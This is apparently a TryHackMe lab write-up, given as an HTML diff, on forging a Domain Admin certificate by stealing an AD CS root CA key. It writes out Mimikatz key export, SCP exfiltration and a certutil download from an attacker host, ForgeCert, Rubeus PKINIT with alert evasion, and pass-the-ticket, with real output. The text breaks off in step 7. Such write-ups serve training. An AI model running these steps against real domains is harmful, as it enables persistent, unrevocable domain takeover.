@@ -1,0 +1,539 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>AD CS Certificate Persistence</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<style>
+/*
+  Layout: field-manual writeup — numbered phases down a terminal-dark page,
+  each step a boxed lab entry with the exact command, a flag table, and the
+  REAL captured output as a PoC terminal block right under it. A single
+  crimson thread runs through (CA compromise = the "nuclear" persistence),
+  with a separate amber "gotcha" callout style for every error the run hit
+  and how it was fixed, so the troubleshooting is part of the walkthrough.
+*/
+:root{
+  --bg:#f5f3ee; --surface:#ffffff; --surface-2:#edeae1;
+  --fg:#1c1b19; --muted:#6b675f; --border:#ddd8cb;
+  --term-bg:#14130f; --term-fg:#d6e9d6; --term-dim:#7f8a7f;
+  --term-green:#7ec97e; --term-red:#e08585; --term-cyan:#79c4d4; --term-amber:#e0b84f;
+  --accent:#8a2e2e; --accent-soft:#f1dede;
+  --gotcha:#9a6a00; --gotcha-soft:#f4e6c4;
+  --ok:#3c6e3c; --ok-soft:#dcefdc;
+  color-scheme:light;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#0e0d0b; --surface:#17150f; --surface-2:#1f1c14;
+    --fg:#eee9da; --muted:#a39d8c; --border:#332f22;
+    --term-bg:#0a0906; --term-fg:#d6e9d6; --term-dim:#6f7a6f;
+    --term-green:#8fd98f; --term-red:#e89393; --term-cyan:#8fd4e4; --term-amber:#e8c66a;
+    --accent:#e07a7a; --accent-soft:#3a1818;
+    --gotcha:#e0ac3f; --gotcha-soft:#3a2d12;
+    --ok:#7fbf7f; --ok-soft:#16260f;
+    color-scheme:dark;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0e0d0b; --surface:#17150f; --surface-2:#1f1c14;
+  --fg:#eee9da; --muted:#a39d8c; --border:#332f22;
+  --term-bg:#0a0906; --term-fg:#d6e9d6; --term-dim:#6f7a6f;
+  --term-green:#8fd98f; --term-red:#e89393; --term-cyan:#8fd4e4; --term-amber:#e8c66a;
+  --accent:#e07a7a; --accent-soft:#3a1818;
+  --gotcha:#e0ac3f; --gotcha-soft:#3a2d12;
+  --ok:#7fbf7f; --ok-soft:#16260f;
+  color-scheme:dark;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg); color:var(--fg);
+  font-family:"IBM Plex Sans",-apple-system,Segoe UI,Arial,sans-serif;
+  line-height:1.6;
+  padding-left:max(16px, env(safe-area-inset-left,0px));
+  padding-right:max(16px, env(safe-area-inset-right,0px));
+}
+h1,h2,h3,h4{font-family:"JetBrains Mono","Fira Code",ui-monospace,monospace; font-weight:700; text-wrap:balance; margin:0 0 .4em 0;}
+code,pre{font-family:"JetBrains Mono","Fira Code",ui-monospace,monospace;}
+a{color:inherit;}
+img{max-width:100%;}
+.wrap{max-width:880px; margin:0 auto; padding-block:40px;}
+
+/* hero */
+.hero{
+  padding:28px 26px; border:1px solid var(--border); border-radius:10px;
+  background:linear-gradient(135deg,var(--accent-soft) 0%, transparent 60%),var(--surface);
+  margin-bottom:26px;
+}
+.hero .eyebrow{font-family:"JetBrains Mono",monospace; font-size:.72rem; letter-spacing:.14em; text-transform:uppercase; color:var(--muted); margin-bottom:10px;}
+.hero h1{font-size:clamp(1.45rem,5vw,2.05rem); line-height:1.15;}
+.hero p{color:var(--muted); max-width:64ch; margin:10px 0 0 0;}
+.hero .room{display:inline-flex; gap:8px; align-items:center; margin-top:16px; font-size:.85rem; padding:7px 12px; border:1px solid var(--border); border-radius:999px; background:var(--surface-2);}
+
+/* toc */
+.toc{display:grid; grid-template-columns:repeat(auto-fit,minmax(210px,1fr)); gap:10px; margin-bottom:34px;}
+.toc a{display:block; padding:12px 14px; border:1px solid var(--border); border-radius:8px; background:var(--surface); text-decoration:none; font-size:.86rem;}
+.toc a span{display:block; color:var(--muted); font-size:.74rem; margin-top:2px;}
+.toc a:hover{border-color:var(--accent);}
+
+/* sections */
+section{margin-bottom:46px;}
+.sec-head{display:flex; align-items:baseline; gap:12px; padding-bottom:10px; border-bottom:2px solid var(--accent); margin-bottom:18px;}
+.sec-num{font-family:"JetBrains Mono",monospace; font-size:.85rem; color:var(--accent); min-width:2ch;}
+.sec-head h2{font-size:1.3rem; margin:0;}
+p{margin:0 0 14px 0;}
+ul,ol{margin:0 0 16px 0; padding-left:1.3em;}
+li{margin-bottom:6px;}
+
+/* callouts */
+.callout{border:1px solid var(--border); border-left:4px solid var(--accent); border-radius:6px; padding:14px 16px; background:var(--surface); margin:0 0 18px 0;}
+.callout.gotcha{border-left-color:var(--gotcha); background:var(--gotcha-soft);}
+.callout.oscp{border-left-color:var(--ok); background:var(--ok-soft);}
+.callout.theory{border-left-color:var(--term-cyan);}
+.callout .tag{font-family:"JetBrains Mono",monospace; font-size:.7rem; letter-spacing:.1em; text-transform:uppercase; color:var(--muted); margin-bottom:6px; display:block;}
+.callout p:last-child{margin-bottom:0;}
+.callout code{background:rgba(127,127,127,.15); padding:1px 5px; border-radius:4px; font-size:.88em;}
+
+/* req table */
+.table-wrap{overflow-x:auto; margin-bottom:20px;}
+.req{width:100%; border-collapse:collapse; font-size:.9rem;}
+.req th,.req td{text-align:left; padding:9px 12px; border-bottom:1px solid var(--border); vertical-align:top;}
+.req th{font-family:"JetBrains Mono",monospace; font-size:.7rem; letter-spacing:.06em; text-transform:uppercase; color:var(--muted); font-weight:600;}
+.req code{font-size:.85em; background:var(--surface-2); padding:1px 5px; border-radius:4px;}
+
+/* steps */
+.step{border:1px solid var(--border); border-radius:10px; background:var(--surface); padding:18px 18px 16px; margin-bottom:20px;}
+.step-head{display:flex; align-items:center; gap:10px; margin-bottom:12px;}
+.step-dot{width:28px;height:28px;border-radius:50%; display:flex;align-items:center;justify-content:center; font-family:"JetBrains Mono",monospace; font-size:.8rem;font-weight:700; background:var(--accent-soft); color:var(--accent); flex:none;}
+.step-head h4{font-size:1.02rem; margin:0;}
+.step-host{font-family:"JetBrains Mono",monospace; font-size:.68rem; color:var(--muted); margin-left:auto; padding:3px 8px; border:1px solid var(--border); border-radius:999px; white-space:nowrap;}
+
+pre.cmd{background:var(--term-bg); color:var(--term-fg); border-radius:8px 8px 0 0; padding:12px 14px; overflow-x:auto; font-size:.8rem; line-height:1.5; margin:0; white-space:pre; border:1px solid var(--border); border-bottom:none;}
+pre.cmd.solo{border-radius:8px; border-bottom:1px solid var(--border); margin-bottom:12px;}
+.cmd .p{color:var(--term-green);}
+.cmd .c{color:var(--term-dim);}
+.cmd .hl{color:var(--term-amber);}
+
+.poc{background:var(--term-bg); border:1px solid var(--border); border-top:none; border-radius:0 0 8px 8px; margin:0 0 12px 0;}
+.poc summary{cursor:pointer; list-style:none; padding:7px 14px; font-family:"JetBrains Mono",monospace; font-size:.7rem; letter-spacing:.08em; text-transform:uppercase; color:var(--term-dim); border-top:1px dashed #2a2a22; user-select:none;}
+.poc summary::-webkit-details-marker{display:none;}
+.poc summary::before{content:"▸ "; color:var(--term-green);}
+.poc[open] summary::before{content:"▾ ";}
+.poc summary:hover{color:var(--term-green);}
+.poc pre{margin:0; padding:4px 14px 14px; overflow-x:auto; font-size:.76rem; line-height:1.45; color:var(--term-fg); white-space:pre; font-family:"JetBrains Mono",monospace;}
+.poc .g{color:var(--term-green);} .poc .r{color:var(--term-red);} .poc .cy{color:var(--term-cyan);} .poc .d{color:var(--term-dim);} .poc .am{color:var(--term-amber);}
+
+.flagtable{width:100%; border-collapse:collapse; margin:0 0 14px 0; font-size:.84rem;}
+.flagtable th,.flagtable td{text-align:left; padding:6px 10px; border-bottom:1px solid var(--border);}
+.flagtable td:first-child{font-family:"JetBrains Mono",monospace; white-space:nowrap; color:var(--accent);}
+.flagtable th{color:var(--muted); font-weight:600; font-size:.7rem; text-transform:uppercase; letter-spacing:.05em;}
+
+/* arch */
+.arch{border:1px solid var(--border); border-radius:10px; background:var(--surface); padding:18px; margin-bottom:10px;}
+.arch table{width:100%; border-collapse:collapse; font-size:.84rem;}
+.arch td{padding:7px 10px; border-bottom:1px solid var(--border);}
+.arch td:first-child{font-family:"JetBrains Mono",monospace; color:var(--accent); white-space:nowrap;}
+.arch td:nth-child(2){font-family:"JetBrains Mono",monospace; color:var(--muted); white-space:nowrap;}
+
+footer{margin-top:40px; padding-top:20px; border-top:1px solid var(--border); color:var(--muted); font-size:.82rem;}
+.ans{display:inline-block; background:var(--ok-soft); border:1px solid var(--ok); color:var(--ok); padding:2px 8px; border-radius:5px; font-family:"JetBrains Mono",monospace; font-size:.85em;}
+</style>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+
+<div class="wrap">
+
+  <div class="hero">
+    <span class="eyebrow">TryHackMe &middot; Persisting Active Directory &middot; Task 4</span>
+    <h1>AD CS Certificate Persistence — Stealing the CA</h1>
+    <p>A full command-by-command walkthrough of credential-agnostic persistence by exporting the root CA's private key and forging a Domain Admin client-auth certificate. Every step carries the real captured output as proof, including each error hit during the run and exactly how it was fixed.</p>
+    <div class="room">🔗 <span>tryhackme.com/room/persistingad</span></div>
+  </div>
+
+  <nav class="toc">
+    <a href="#arch"><strong>Lab Architecture</strong><span>The forest &amp; our foothold</span></a>
+    <a href="#why"><strong>Why Certificates</strong><span>Credential-agnostic persistence</span></a>
+    <a href="#need"><strong>What You Need</strong><span>Prereqs at a glance</span></a>
+    <a href="#steps"><strong>The Attack</strong><span>7 steps, full PoC</span></a>
+    <a href="#gotchas"><strong>Errors &amp; Fixes</strong><span>Every snag from the real run</span></a>
+    <a href="#blue"><strong>Blue Team</strong><span>Why it's near-unremovable</span></a>
+    <a href="#answers"><strong>Task Answers</strong><span>SID-History questions</span></a>
+  </nav>
+
+  <!-- ARCHITECTURE -->
+  <section id="arch">
+    <div class="sec-head"><span class="sec-num">00</span><h2>Lab Architecture</h2></div>
+    <p>Two-domain forest. We operate inside the child domain <code>za.tryhackme.loc</code>. The CA service (<code>za-THMDC-CA</code>) runs on the domain controller, and the attack is driven from an unprivileged workstation.</p>
+    <div class="arch">
+      <table>
+        <tr><td>THMDC / THMCHILDDC</td><td>10.200.73.101</td><td>DC of <code>za.tryhackme.loc</code> + <strong>AD CS Certificate Authority</strong> — the target</td></tr>
+        <tr><td>THMROOTDC</td><td>10.200.73.100</td><td>Forest root DC (<code>tryhackme.loc</code>) — wrong realm for our TGT</td></tr>
+        <tr><td>THMSERVER1</td><td>10.200.73.201</td><td>Member server</td></tr>
+        <tr><td>THMSERVER2</td><td>10.200.73.202</td><td>Member server</td></tr>
+        <tr><td>THMWRK1</td><td>10.200.73.248</td><td>Our foothold — <code>mandy.armstrong</code> / <code>aaron.jones</code> (low-priv), where ForgeCert &amp; Rubeus live</td></tr>
+        <tr><td>Kali (AttackBox)</td><td>10.150.73.7</td><td>Our box — staging point for file transfers</td></tr>
+      </table>
+    </div>
+    <div class="callout theory">
+      <span class="tag">The two hosts that matter</span>
+      <p><strong>THMDC (10.200.73.101)</strong> holds the CA private key — extraction happens here. <strong>THMWRK1 (10.200.73.248)</strong> is where we forge the cert and request the TGT as a normal user. Kali sits in the middle only to shuttle the <code>.pfx</code> file between them.</p>
+    </div>
+  </section>
+
+  <!-- WHY -->
+  <section id="why">
+    <div class="sec-head"><span class="sec-num">01</span><h2>Why Certificates — Credential-Agnostic Persistence</h2></div>
+    <p>Golden/silver tickets and credential dumps all die the moment the blue team rotates the right secret. Certificate persistence does not. A valid <strong>Client Authentication</strong> certificate can be used to request a Kerberos TGT via PKINIT — and <strong>password rotations don't invalidate it</strong>. It stays good until it expires (typically ~5 years) or is explicitly revoked.</p>
+    <div class="callout">
+      <span class="tag">Going after the CA itself</span>
+      <p>Instead of enrolling one cert, we steal the <strong>root CA's private key</strong>. With it we can forge a client-auth certificate for <em>any</em> user, anytime. The killer detail: because these certs were never issued through AD CS, they <strong>don't appear on the CA's issued-certificate list, so they cannot be revoked</strong>. The only cleanup is rotating the entire root CA — which invalidates every certificate in the environment and forces a PKI rebuild.</p>
+    </div>
+    <div class="callout">
+      <span class="tag">⚠ Authorized-lab / CTF content</span>
+      <p>This is TryHackMe's <em>Persisting Active Directory</em> room. The source material itself warns these techniques are destructive and, in real engagements, are usually <strong>simulated rather than executed</strong>. Only ever run them against systems you are explicitly authorized to test.</p>
+    </div>
+  </section>
+
+  <!-- NEED -->
+  <section id="need">
+    <div class="sec-head"><span class="sec-num">02</span><h2>What You Need</h2></div>
+    <div class="table-wrap">
+      <table class="req">
+        <tr><th>Requirement</th><th>Why</th><th>In this run</th></tr>
+        <tr><td>Admin access to the CA server</td><td>CA private key is DPAPI-protected on disk; need local admin to patch memory &amp; export it</td><td>SSH to THMDC as <code>za\administrator</code></td></tr>
+        <tr><td>Mimikatz</td><td>Patches CryptoAPI/CNG to force a non-exportable key exportable, then exports it</td><td><code>C:\Tools\mimikatz_trunk\x64</code></td></tr>
+        <tr><td>Root CA <code>.pfx</code> (cert + private key)</td><td>The signing key ForgeCert uses to mint trusted certs</td><td><code>local_machine_My_1_za-THMDC-CA.pfx</code></td></tr>
+        <tr><td>ForgeCert</td><td>Forges a client-auth cert for any UPN, signed by the stolen CA key</td><td><code>C:\Tools\ForgeCert\</code> on THMWRK1</td></tr>
+        <tr><td>Rubeus</td><td>Uses the forged cert (PKINIT) to request a real TGT</td><td><code>C:\Tools\Rubeus.exe</code> on THMWRK1</td></tr>
+        <tr><td>A legitimate target UPN</td><td>SubjectAltName must be a real account to impersonate</td><td><code>Administrator@za.tryhackme.loc</code></td></tr>
+      </table>
+    </div>
+  </section>
+
+  <!-- STEPS -->
+  <section id="steps">
+    <div class="sec-head"><span class="sec-num">03</span><h2>The Attack — Step by Step (with PoC)</h2></div>
+
+    <!-- STEP 1 -->
+    <div class="step">
+      <div class="step-head"><div class="step-dot">1</div><h4>SSH to the CA server &amp; launch Mimikatz</h4><span class="step-host">THMDC · 10.200.73.101</span></div>
+      <pre class="cmd solo"><span class="c"># from Kali — SSH in as the domain Administrator (Task 2 creds)</span>
+ssh 'za.tryhackme.loc\administrator'@thmdc.za.tryhackme.loc
+
+<span class="c"># on THMDC — make a working dir and start mimikatz</span>
+mkdir mandy &amp;&amp; cd mandy
+C:\Tools\mimikatz_trunk\x64\mimikatz.exe</pre>
+      <div class="callout gotcha">
+        <span class="tag">⚠ Gotcha #1 — use the RIGHT machine</span>
+        <p>The CA private key lives <strong>only on THMDC</strong>. Running this on THMWRK1 shows just that workstation's own computer cert (template <code>ComputerCertificateTemplate</code>) — not the CA. If you only see one certificate, you're on the wrong host. Confirm with <code>ipconfig</code>: THMDC = <code>.101</code>, THMWRK1 = <code>.248</code>.</p>
+      </div>
+    </div>
+
+    <!-- STEP 2 -->
+    <div class="step">
+      <div class="step-head"><div class="step-dot">2</div><h4>List the certificate store &amp; identify the CA cert</h4><span class="step-host">THMDC · mimikatz</span></div>
+      <pre class="cmd"><span class="p">mimikatz #</span> <span class="hl">crypto::certificates /systemstore:local_machine</span></pre>
+      <details class="poc" open>
+        <summary>Real output — 4 certs, index 1 is the CA</summary>
+<pre> <span class="d">0.</span>
+    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
+    |Key Container : te-DomainControllerAuthentication-5ed52c94-...
+        Exportable key : <span class="r">NO</span>
+
+ <span class="g">1. za-THMDC-CA</span>
+    Subject  : DC=loc, DC=tryhackme, DC=za, <span class="g">CN=za-THMDC-CA</span>
+    Issuer   : DC=loc, DC=tryhackme, DC=za, <span class="g">CN=za-THMDC-CA</span>   <span class="d">&lt;- self-signed = ROOT CA</span>
+    Validity : 4/27/2022 7:58:15 PM -&gt; 4/27/<span class="g">2027</span> 8:08:09 PM   <span class="d">&lt;- ~5yr validity</span>
+    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e
+        Key Container  : za-THMDC-CA
+        Provider       : Microsoft Software Key Storage Provider
+        Export policy  : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; )
+        Exportable key : <span class="g">YES</span>
+
+ <span class="d">2. THMDC.za.tryhackme.loc</span>   <span class="d">(DC's own machine cert — not useful)</span>
+ <span class="d">3.</span>   <span class="d">(KerberosAuthentication template — not useful)</span></pre>
+      </details>
+      <p><strong>How to spot the CA cert:</strong> its <code>Subject</code> <em>equals</em> its <code>Issuer</code> (self-signed root), the <code>Key Container</code> is literally <code>za-THMDC-CA</code>, and uniquely here <code>Exportable key : YES</code>. The other three are leaf certs issued <em>by</em> the CA (computer/DC/Kerberos templates) and are marked <code>Exportable key : NO</code>.</p>
+    </div>
+
+    <!-- STEP 3 -->
+    <div class="step">
+      <div class="step-head"><div class="step-dot">3</div><h4>Patch memory, then export all certs to disk</h4><span class="step-host">THMDC · mimikatz</span></div>
+      <pre class="cmd"><span class="p">mimikatz #</span> <span class="hl">privilege::debug</span>
+<span class="p">mimikatz #</span> <span class="hl">crypto::capi</span>
+<span class="p">mimikatz #</span> <span class="hl">crypto::cng</span>
+<span class="p">mimikatz #</span> <span class="hl">crypto::certificates /systemstore:local_machine /export</span></pre>
+      <table class="flagtable">
+        <tr><th>Command</th><th>Meaning</th></tr>
+        <tr><td>privilege::debug</td><td>Acquire SeDebugPrivilege — needed to patch the crypto service memory</td></tr>
+        <tr><td>crypto::capi</td><td>Patch the legacy CryptoAPI provider in memory so "non-exportable" is ignored</td></tr>
+        <tr><td>crypto::cng</td><td>Patch the KeyIso (CNG) service — the CA key uses CNG, so this is the one that matters here</td></tr>
+        <tr><td>/export</td><td>Write every cert to disk as both <code>.der</code> (public) and <code>.pfx</code> (with private key), password <code>mimikatz</code></td></tr>
+      </table>
+      <details class="poc" open>
+        <summary>Real output — export succeeded, filenames reveal each cert</summary>
+<pre><span class="p">mimikatz #</span> privilege::debug
+Privilege '20' OK
+<span class="p">mimikatz #</span> crypto::capi
+Local CryptoAPI RSA CSP patched
+Local CryptoAPI DSS CSP patched
+<span class="p">mimikatz #</span> crypto::cng
+"KeyIso" service patched
+<span class="p">mimikatz #</span> crypto::certificates /systemstore:local_machine /export
+ ...
+ 1. za-THMDC-CA
+        Exportable key : <span class="g">YES</span>
+        Public export  : OK - 'local_machine_My_1_za-THMDC-CA.der'
+        Private export : <span class="g">OK - 'local_machine_My_1_za-THMDC-CA.pfx'</span>
+ ...
+<span class="p">C:\...\mandy&gt;</span> dir
+10/20/2026  08:54 AM    1,423 local_machine_My_0_.der
+10/20/2026  08:54 AM    3,299 local_machine_My_0_.pfx
+10/20/2026  08:54 AM      939 <span class="g">local_machine_My_1_za-THMDC-CA.der</span>
+10/20/2026  08:54 AM    2,685 <span class="g">local_machine_My_1_za-THMDC-CA.pfx</span>   <span class="d">&lt;- THIS ONE</span>
+10/20/2026  08:54 AM    1,534 local_machine_My_2_THMDC.za.tryhackme.loc.der
+10/20/2026  08:54 AM    3,380 local_machine_My_2_THMDC.za.tryhackme.loc.pfx
+10/20/2026  08:54 AM    1,465 local_machine_My_3_.der
+10/20/2026  08:54 AM    3,321 local_machine_My_3_.pfx</pre>
+      </details>
+      <p class="callout" style="border-left-color:var(--ok)">The filename is the easiest signal: <code>local_machine_My_<strong>1</strong>_za-THMDC-CA.pfx</code> is the root CA key — exactly what ForgeCert needs. (If <code>crypto::cng</code> says someone already patched it, that's fine — continue.)</p>
+    </div>
+
+    <!-- STEP 4 -->
+    <div class="step">
+      <div class="step-head"><div class="step-dot">4</div><h4>Exfil the CA <code>.pfx</code> to Kali, then stage it to THMWRK1</h4><span class="step-host">THMDC → Kali → THMWRK1</span></div>
+      <pre class="cmd solo"><span class="c"># on THMDC — push the CA pfx straight to Kali over SCP</span>
+scp local_machine_My_1_za-THMDC-CA.pfx shubham@10.150.73.7:/home/shubham/OSCP/Persistence</pre>
+      <details class="poc" open>
+        <summary>Real output — transfer 100%</summary>
+<pre><span class="p">C:\...\mandy&gt;</span> scp local_machine_My_1_za-THMDC-CA.pfx shubham@10.150.73.7:/home/shubham/OSCP/Persistence
+shubham@10.150.73.7's password:
+local_machine_My_1_za-THMDC-CA.pfx   <span class="g">100% 2685    24.0KB/s   00:00</span></pre>
+      </details>
+      <p>Then serve it from Kali (<code>python3 -m http.server 8000</code>) and pull it onto THMWRK1 with certutil — or SMB. From THMWRK1 as <code>mandy.armstrong</code>:</p>
+      <pre class="cmd"><span class="c"># on THMWRK1 — grab it off Kali's HTTP server into C:\Tools</span>
+certutil.exe -urlcache -split -f http://10.150.73.7:8000/local_machine_My_1_za-THMDC-CA.pfx local_machine_My_1_za-THMDC-CA.pfx</pre>
+      <details class="poc" open>
+        <summary>Real output — certutil download + parse (asks for PFX password = mimikatz)</summary>
+<pre>****  Online  ****
+Enter PFX password:
+================ Certificate 0 ================
+Serial Number: 1ef93e3a3da3249842ef04e3da57e190
+Issuer: CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
+ NotBefore: 4/27/2022 7:58 PM
+ NotAfter: 4/27/2027 8:08 PM
+<span class="g">Subject: CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc</span>
+Certificate Template Name (Certificate Type): <span class="g">CA</span>
+<span class="g">Root Certificate: Subject matches Issuer</span>
+Template: CA, Root Certification Authority
+Cert Hash(sha1): c12fcb4b88467854b3d4d7f762adb50b0fd8346e
+  Provider = Microsoft Software Key Storage Provider
+<span class="g">CertUtil: -URLCache command completed successfully.</span></pre>
+      </details>
+      <div class="callout gotcha">
+        <span class="tag">⚠ Gotcha #2 — Kali→Windows SCP fails with "No such file or directory"</span>
+        <p>Pulling <em>from</em> Windows with <code>scp administrator@&lt;ip&gt;:"C:\...\file.pfx" .</code> on modern Kali fails because OpenSSH 9+ uses SFTP, which mis-parses the <code>C:</code> drive colon. Fix: add <code>-O</code> to force the legacy SCP protocol &rarr; <code>scp -O administrator@10.200.73.248:"C:\...\file.pfx" .</code>. In this run we sidestepped it entirely by pushing from the Windows side and pulling with <code>certutil</code> over HTTP.</p>
+      </div>
+    </div>
+
+    <!-- STEP 5 -->
+    <div class="step">
+      <div class="step-head"><div class="step-dot">5</div><h4>Forge a Domain Admin client-auth certificate</h4><span class="step-host">THMWRK1 · C:\Tools</span></div>
+      <pre class="cmd"><span class="p">C:\Tools&gt;</span> <span class="hl">C:\Tools\ForgeCert\ForgeCert.exe</span> --CaCertPath local_machine_My_1_za-THMDC-CA.pfx ^
+   --CaCertPassword mimikatz --Subject CN=User ^
+   --SubjectAltName Administrator@za.tryhackme.loc ^
+   --NewCertPath fullAdmin.pfx --NewCertPassword Password123</pre>
+      <table class="flagtable">
+        <tr><th>Flag</th><th>Meaning</th></tr>
+        <tr><td>--CaCertPath</td><td>The stolen CA <code>.pfx</code> — the signing key</td></tr>
+        <tr><td>--CaCertPassword</td><td><code>mimikatz</code> — the default password mimikatz set on export</td></tr>
+        <tr><td>--Subject</td><td>Cert common name — cosmetic, doesn't matter for auth</td></tr>
+        <tr><td>--SubjectAltName</td><td>The UPN to impersonate — <strong>must be a real account</strong> (<code>Administrator@za.tryhackme.loc</code>)</td></tr>
+        <tr><td>--NewCertPath</td><td>Output file for the forged cert</td></tr>
+        <tr><td>--NewCertPassword</td><td>Password for the new cert's private key — your choice (<code>Password123</code>)</td></tr>
+      </table>
+      <details class="poc" open>
+        <summary>Real output — forged &amp; saved</summary>
+<pre>CA Certificate Information:
+  Subject:        CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
+  Thumbprint:     C12FCB4B88467854B3D4D7F762ADB50B0FD8346E
+
+Forged Certificate Information:
+  Subject:        CN=User
+  <span class="g">SubjectAltName: Administrator@za.tryhackme.loc</span>
+  Issuer:         CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
+  Start Date:     10/20/2026 9:01:26 AM
+  End Date:       10/20/<span class="g">2027</span> 9:01:26 AM
+  Thumbprint:     C1D096A9E87B4598F0DAE8F38C5990D67C183C37
+
+<span class="g">Done. Saved forged certificate to fullAdmin.pfx with the password 'Password123'</span></pre>
+      </details>
+      <div class="callout gotcha">
+        <span class="tag">⚠ Gotcha #3 — "'ForgeCert.exe' is not recognized"</span>
+        <p>ForgeCert isn't in <code>C:\Tools</code> directly — it's in the <code>ForgeCert\</code> subfolder. Call it with the full path <code>C:\Tools\ForgeCert\ForgeCert.exe</code> (or <code>cd ForgeCert</code> first).</p>
+      </div>
+    </div>
+
+    <!-- STEP 6 -->
+    <div class="step">
+      <div class="step-head"><div class="step-dot">6</div><h4>Request a TGT with the forged cert (Rubeus / PKINIT)</h4><span class="step-host">THMWRK1 · C:\Tools</span></div>
+      <pre class="cmd"><span class="p">C:\Tools&gt;</span> <span class="hl">Rubeus.exe asktgt</span> /user:Administrator /enctype:aes256 ^
+   /certificate:fullAdmin.pfx /password:Password123 ^
+   /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.73.101</pre>
+      <table class="flagtable">
+        <tr><th>Flag</th><th>Meaning</th></tr>
+        <tr><td>asktgt</td><td>Request a Ticket Granting Ticket</td></tr>
+        <tr><td>/user</td><td>Account to impersonate — must match the cert's SubjectAltName UPN</td></tr>
+        <tr><td>/enctype:aes256</td><td>Force AES256 — default RC4 triggers an overpass-the-hash alert (evasion)</td></tr>
+        <tr><td>/certificate</td><td>The forged <code>fullAdmin.pfx</code></td></tr>
+        <tr><td>/password</td><td>The cert's password (<code>Password123</code> from ForgeCert)</td></tr>
+        <tr><td>/outfile</td><td>Where to write the <code>.kirbi</code> TGT</td></tr>
+        <tr><td>/domain</td><td>FQDN of the domain being attacked</td></tr>
+        <tr><td>/dc</td><td>IP of a DC <strong>running the CA service</strong> — here <code>10.200.73.101</code></td></tr>
+      </table>
+      <details class="poc" open>
+        <summary>Real output — TGT request successful</summary>
+<pre><span class="cy">[*]</span> Action: Ask TGT
+<span class="cy">[*]</span> Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=User
+<span class="cy">[*]</span> Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\Administrator'
+<span class="g">[+] TGT request successful!</span>
+<span class="cy">[*]</span> base64(ticket.kirbi):
+      doIGDDCCBgigAwIBBaEDAgEWooIFADCCBPxhggT4MIIE9KADAgEF...
+      <span class="d">( ...snip... )</span>
+<span class="cy">[*]</span> Ticket written to administrator.kirbi
+
+  ServiceName   :  krbtgt/za.tryhackme.loc
+  <span class="g">UserName      :  Administrator</span>
+  UserRealm     :  ZA.TRYHACKME.LOC
+  StartTime     :  10/20/2026 9:07:21 AM
+  EndTime       :  10/20/2026 7:07:21 PM
+  RenewTill     :  10/27/2026 8:07:21 AM
+  Flags         :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType       :  aes256_cts_hmac_sha1</pre>
+      </details>
+      <details class="poc" open>
+        <summary>Real output — the error sequence before it worked (16 → 68 → 68 → 16 → gpupdate → success)</summary>
+<pre><span class="d"># try 1: /dc:10.200.73.101</span>
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\Administrator'
+<span class="r">[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP</span>
+
+<span class="d"># try 2: /dc:10.200.73.100  (wrong DC — forest root)</span>
+<span class="r">[X] KRB-ERROR (68) : KDC_ERR_WRONG_REALM</span>
+
+<span class="d"># certutil -pulse as low-priv user → denied (not needed)</span>
+<span class="r">CertUtil: -pulse command FAILED: 0x80070005 (ERROR_ACCESS_DENIED)</span>
+
+<span class="d"># try 3: /dc:10.200.73.100 again → still wrong realm</span>
+<span class="r">[X] KRB-ERROR (68) : KDC_ERR_WRONG_REALM</span>
+
+<span class="d"># try 4: /dc:10.200.73.101 → still no PKINIT</span>
+<span class="r">[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP</span>
+
+<span class="am"># THE FIX:</span>
+<span class="p">C:\Tools&gt;</span> gpupdate /force
+<span class="g">Computer Policy update has completed successfully.</span>
+<span class="g">User Policy update has completed successfully.</span>
+
+<span class="d"># try 5: /dc:10.200.73.101 → WORKS</span>
+<span class="g">[+] TGT request successful!</span></pre>
+      </details>
+      <div class="callout gotcha">
+        <span class="tag">⚠ Gotcha #4 — the two errors before it worked</span>
+        <p><code>KDC_ERR_PADATA_TYPE_NOSUPP</code> (error 16) against <code>.101</code> = the DC wasn't accepting PKINIT preauth yet. <strong>Fix: run <code>gpupdate /force</code></strong> (nudges cert auto-enrollment / policy), then retry — that's what finally returned the TGT.<br>
+        <code>KDC_ERR_WRONG_REALM</code> (error 68) against <code>.100</code> = that's <strong>THMROOTDC</strong>, the forest-root realm <code>tryhackme.loc</code>, not our child domain. Always point <code>/dc</code> at the DC for <em>our</em> realm (<code>.101</code>).</p>
+      </div>
+    </div>
+
+    <!-- STEP 7 -->
+    <div class="step">
+      <div class="step-head"><div class="step-dot">7</div><h4>Pass-the-Ticket &amp; prove Domain Admin access</h4><span class="step-host">THMWRK1 · C:\Tools</span></div>
+      <pre class="cmd"><span class="p">C:\Tools&gt;</span> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
+<span class="p">mimikatz #</span> <span class="hl">kerberos::ptt administrator.kirbi</span>
+<span class="p">mimikatz #</span> exit
+
+<span class="p">C:\Tools&gt;</span> <span class="hl">klist</span>
